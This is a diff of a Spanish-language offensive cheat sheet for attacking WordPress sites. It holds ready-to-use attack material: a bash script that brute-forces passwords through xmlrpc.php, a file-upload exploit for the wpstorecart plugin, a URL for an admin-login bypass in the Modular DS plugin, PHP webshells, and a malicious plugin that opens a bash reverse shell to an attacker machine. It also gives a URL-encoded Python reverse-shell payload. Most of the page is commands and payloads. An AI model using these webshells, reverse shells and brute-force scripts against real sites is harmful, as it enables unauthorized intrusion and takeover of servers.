@@ -21,7 +21,7 @@ Tags: #WordPress #CMS #WPScan #WPProbe #Enumeracion #FuerzaBruta #RCE #LFI #xmlr
 * [DVWP Lab](https://github.com/vavkamil/dvwp) → laboratorio práctico
 * [Xmlrpc Abuse](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)
 
-## 1. ENUMERACIÓN INICIAL
+## 1. ENUMERACIÓN MANUAL
 
 ### Credenciales por defecto 
 ```bash 
@@ -66,7 +66,7 @@ admin:password
 # Iterar para encontrar varios usuarios
 ```
 
-## 2. WPSCAN — ENUMERACIÓN COMPLETA
+## 2. WPSCAN TOOL — ENUMERACIÓN COMPLETA
 
 ### Escaneo básico
 ```bash
@@ -81,18 +81,19 @@ admin:password
 ```bash
 ❯ wpscan --url http://<IP>/wordpress/ --enumerate u --no-update 
 # Enumerar usuarios sin actualizar la herramienta 
+ 
+❯ wpscan --url http://<IP>/ -e 
+# Enumerar usuarios 
 
-❯ wpscan --url http://<IP>/ -e u,vp
-# -e u → usuarios | -e vp → plugins vulnerables
+❯ wpscan --url http://<IP> --api-token="<TOKEN>" --enumerate p --plugins-detection mixed   <- (MEJOR OPCIÓN USAR API TOKEN)
+❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"   
+# Con API token → CVEs y detalles de vulnerabilidades
 
 ❯ wpscan --url http://<IP>/ -e u,vp,vt,dbe
 # vt → temas vulnerables | dbe → bases de datos expuestas
 
 ❯ wpscan --url http://<IP>/ -e u,vp --plugins-detection aggressive
 # aggressive → más completo | mixed → por defecto | passive → silencioso
-
-❯ wpscan --url http://<IP>/ -e vp --api-token="<TOKEN>"
-# Con API token → CVEs y detalles de vulnerabilidades
 ```
 
 ### Fuerza bruta de credenciales
@@ -128,17 +129,24 @@ admin:password
 ../../../wp-content/uploads/<archivo>
 ```
 
-## 3. WPPROBE
+## 3. WPPROBE TOOL
+
+```bash 
+❯ apt install wpprobe   # Instalar la herramienta 
+❯ wpprobe update-db     # Actualizar la DB
+```
 
 ```bash
-❯ wpprobe http://<IP>/
-# Enumeración básica → plugins instalados
+❯ wpprobe -h     # Ver panel de ayuda
 
-❯ wpprobe http://<IP>/ --enumerate
-# Enumeración extendida → versiones de plugins
+❯ wpprobe scan -u http://<IP>/ --mode hybrid -v    <- (MEJOR OPCIÓN PERO TARDADO)
+# Combina las técnicas de detección disponibles 
 
-❯ pip3 install wpprobe --break-system-packages
-# Instalar si no está disponible
+❯ wpprobe scan -u http://<IP>     
+# Enumeración básica → plugins instalados  
+
+❯ wpprobe scan -u http://10.0.16.148/ --mode bruteforce -v
+# Bruteforce de plugins 
 ```
 
 ## 4. XMLRPC.PHP — ENUMERACIÓN Y FUERZA BRUTA
@@ -148,6 +156,7 @@ Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones
 
 ### Verificar si está expuesto
 ```bash
+Paso 1:
 ❯ curl -s -X GET "http://<IP>/xmlrpc.php"
 # Devuelve mensaje → confirma que está disponible (solo acepta POST)
 
@@ -156,7 +165,7 @@ Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones
 # Listar métodos → buscar wp.getUsersBlogs → permite fuerza bruta
 ```
 
-### Listar métodos con archivo XML
+### Listar métodos con archivo XML (Modo automatizado)
 ```bash
 ❯ nvim file.xml
 # Contenido del archivo:
@@ -171,10 +180,18 @@ Si esta expuesto, podemos enumerar credenciales validas y solo acepta peticiones
 # -d@ → usar archivo como body del POST
 ```
 
-### Script de fuerza bruta via xmlrpc
+### Script de fuerza bruta vía xmlrpc
 ```bash
+Esto funciona cuando ya se dispone de un usuario válido, el cual debe colocarse en el primer campo (value); únicamente será necesario proporcionar o comprobar la contraseña correspondiente.
+
+Paso 2:
+# Crear el script 
 ❯ nvim xmlrpc_bruteforce.sh
 
+
+# Script para obtener la password de un usuario válido vía XMLRPC
+# Poner un usuario válido 
+# Colocar la IP del server 
 #!/bin/bash 
 
 function ctrl_c(){
@@ -195,7 +212,7 @@ function createXML(){
 	<methodCall> 
 	<methodName>wp.getUsersBlogs</methodName> 
 	<params> 
-	<param><value>omar</value></param> 
+	<param><value>user</value></param> 
 	<param><value>$password</value></param> 
 	</params> 
 	</methodCall>
@@ -204,7 +221,7 @@ function createXML(){
 	response=$(curl -s -X POST "http://IP/xmlrpc.php" -d@file.xml)
 
 	if [ ! "$(echo $response | grep 'Incorrect username or password.')" ]; then 
-		echo -e "\n[+] La contraseña para el usuario omar es $password"
+		echo -e "\n[+] La contraseña es $password"
 		echo 0
 	fi
 }
@@ -212,17 +229,53 @@ function createXML(){
 cat /usr/share/wordlists/rockyou.txt | while read password; do 
 	createXML $password
 done 
+```
 
+```bash 
+Paso 3:
+# Dar permisos de ejecución y ejecutar el script 
 ❯ chmod +x xmlrpc_bruteforce.sh && ./xmlrpc_bruteforce.sh
 ```
 
----
 
-## 5. OBTENER RCE — PANEL DE ADMINISTRACIÓN
+## 5. EXPLOTAR UN PLUGIN  VULNERABLE 
+### Wpstorecart 2.5.27 a 2.5.29
+
+* [CVE-2012-3576](https://www.exploit-db.com/exploits/19023)
+
+```bash
+❯ curl -F "Filedata=@./shell.php" http://<IP>/wp-content/plugins/wpstorecart/php/upload.php
+# Requiere plugin wpstorecart vulnerable
+
+# Si la subida es exitosa, el archivo queda accesible desde:
+	http://IP/wp-content/plugins/wpstorecart/shell.php
+	http://IP/wp-content/plugins/wpstorecart/shell.php?cmd=whoami   # Ejecutar un comando 
+```
+
+```bash 
+❯ nvim shell.php   # Creaar y agregar el siguiente contenido al archvio 
+
+<?php 
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; 
+?>
+```
+
+### Modular DS < 2.5.2 - CVE-2026-23550: Privilege Escalation 
+
+* [CVE-2026-23550](https://hurayraiit.com/blog/cve-2026-23550-critical-privilege-escalation-in-wordpress-modular-ds-plugin-cvss-10/)
+
+```bash 
+# Colocar esta url en el navegador y automáaticamente ingresas al panel del admin 
+http://IP/api/modular-connector/login/anything?origin=mo&type=foo
+```
+
+
+## 6. OBTENER RCE — PANEL DE ADMINISTRACIÓN (Dentro de Wordpress)
 
 ### Opción 1 — Editar tema existente (más rápido)
 ```bash
-# Appearance → Theme Editor → seleccionar tema activo → 404.php Template
+# Appearance → Theme File Editor → seleccionar tema activo → 404.php Template
+# Si no sale el 'Theme Editor' es que esta deshabilitado y el vector es por 'plugin'
 
 Forma 1:
 # Webshell para ejecutar comandos
@@ -268,52 +321,57 @@ Para la forma 2:
 
 ### Opción 3 — Plugin con reverse shell
 ```bash
-❯ mkdir evil-plugin
-❯ nvim evil-plugin/evil-plugin.php
-
-Forma 1:
-	<?php
-	/**
-	 * Plugin Name: Evil Plugin
-	 * Description: Update
-	 * Version: 1.0
-	 */
-	system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
-	?>
-
-o 
-
-Forma 2:
-	<?php
-	/**
-	 * Plugin Name: Evil Plugin
-	 * Description: Update
-	 * Version: 1.0
-	 */
-	if (isset($_GET['cmd'])) {
-		system($_GET['cmd']);
-	}
-	?>
+Paso 1:
+❯ mkdir wordpress-plugin
+❯ nvim wordpress-plugin/wordpress-plugin.php
 
 
-❯ zip -r evil-plugin.zip evil-plugin/
+Forma 1: Contenido del archivo   <- MEJOR OPCIÓN 
+<?php
+/**
+* Plugin Name: Evil Plugin
+* Description: Update
+* Version: 1.0
+*/
+if (isset($_GET['cmd'])) {
+    echo shell_exec($_GET['cmd']);
+    exit;
+}
+?>
+
+
+Forma 2: Contenido del archivo
+<?php
+/**
+* Plugin Name: Evil Plugin
+* Description: Update
+* Version: 1.0
+*/
+system("bash -c 'bash -i >& /dev/tcp/<IP_KALI>/443 0>&1'");
+?>
+
+Paso 2:
+❯ zip -r wordpress-plugin.zip wordpress-plugin/
 # Plugins → Add New → Upload Plugin → Install Now → Activate
-# Al activar → ejecuta la reverse shell
+# Al activar → ejecuta la reverse shell si se coloco el contenido de la forma 2
 ```
 
+
 ```bash 
+Paaso 3:
 Para la forma 1:
-# Para reverse shell en Kali
-❯ rlwrap nc -nlvp 443
-```
-
-```bash 
-Para la forma 2:
 # Ejecutar comandos desde la webshell 
-❯ http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php?cmd=whoami
+❯ http://IP/wordpress/wp-content/plugins/wordpress-plugin/wordpress-plugin.php?cmd=whoami
+
+# Ejecutar la Revershell 
+❯ http://10.0.16.148/wordpress/wp-content/plugins/wordpress-plugin/wordpress-plugin.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket();s.connect((%22IP_Kali%22,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(%5B%22/bin/bash%22%5D)%27
 
 # Ejecutar comandos desde Kali 
-❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?cmd\=whoami
+❯ curl http://IP/wordpress/wp-content/plugins/wordpress-plugin/wordpress-plugin.php\?cmd\=whoami
+
+
+Para la forma 2:
+❯ penelope nc -nlvp 4444     # Recibir la revershell 
 ```
 
 ```bash 
@@ -365,11 +423,4 @@ Para la forma 3:
 
 # Ejecutar comandos desde Kali 
 ❯ curl http://IP/wordpress/wp-content/plugins/evil-plugin/evil-plugin.php\?passwd\=5e280cb0e45fb3171c53cd8dd49df47f\&cmd\=whoami
-```
-
-### Opción 4 — Upload vía plugin vulnerable
-```bash
-❯ curl -F "Filedata=@./shell.php" http://<IP>/wp-content/plugins/wpstorecart/php/upload.php
-# Requiere plugin wpstorecart vulnerable
-# Acceder: http://IP/wp-content/plugins/wpstorecart/shell.php
 ```
